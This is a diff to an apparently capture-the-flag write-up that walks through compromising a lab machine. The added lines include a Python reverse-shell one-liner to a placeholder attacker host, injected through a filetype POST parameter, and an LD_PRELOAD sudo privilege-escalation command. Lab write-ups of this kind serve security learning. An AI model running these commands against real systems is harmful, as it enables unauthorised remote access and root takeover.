@@ -71,6 +71,9 @@ It worked. What we see is a page with few pictures to download. Let's try incept
 Tampering with the parameters for the POST request and find that the filetype parameter might be injectable. So, we prepare a python reverse shell and place in filetype section and send the request.
 
 ![18](https://user-images.githubusercontent.com/31168741/203584234-6073bc41-3f86-41a7-a2c3-9fe9cd38dbf4.PNG)
+
+The reverse shell: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[LHOST]",[LPORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`
+
 ![29](https://user-images.githubusercontent.com/31168741/203584370-2ec4ea71-7176-41c0-bbb0-7c373f8f4df9.PNG)
 ![19](https://user-images.githubusercontent.com/31168741/203584398-ba1628ea-8b44-4fa6-95f1-58abb8b8d6e7.PNG)
 
@@ -78,15 +81,26 @@ We're in the target machine. Looking a little here and there helped me with the 
 
 ![20](https://user-images.githubusercontent.com/31168741/203584616-86f9d8fe-7590-4c27-938b-10b1f34d6690.PNG)
 
-Second, to own the system, let's check the sudo rights: `sudo -l`
+Second, to own the system, let's check the sudo rights: `sudo -l`.
 
 ![21](https://user-images.githubusercontent.com/31168741/203584890-1a8e1b17-0468-4ece-9b32-3eaf5c5b82c0.PNG)
 
-LD_PRELOAD can be invoked with sudo, let’s create a simple PE shell to exploit this
+LD_PRELOAD can be invoked with sudo, let’s create a simple PE shell to exploit this.
 
 ![22](https://user-images.githubusercontent.com/31168741/203585120-960af202-007e-419a-ab08-88f12e474960.PNG)
 ![25](https://user-images.githubusercontent.com/31168741/203585279-40c47a8f-d436-4fec-bc14-03ff8b146e7e.PNG)
+
+Compile the file.
+
 ![27](https://user-images.githubusercontent.com/31168741/203585320-d15b7a67-3a79-47a3-9e1f-2be25eff6950.PNG)
+
+Now, upload it to the target machine through python server.
+
 ![23](https://user-images.githubusercontent.com/31168741/203585445-42a08f82-64b7-485f-bb6a-6442790c1026.PNG)
 ![24](https://user-images.githubusercontent.com/31168741/203585498-5daf23df-1f33-458d-a738-c13ca080131c.PNG)
+
+Now the exploit is in the target machine. Trigger the shell to enter as root: `sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh`
+
 ![28](https://user-images.githubusercontent.com/31168741/203585818-397e1d19-ce2f-4080-88b8-76813f5d7e00.PNG)
+
+Operating as root! We found root flag!
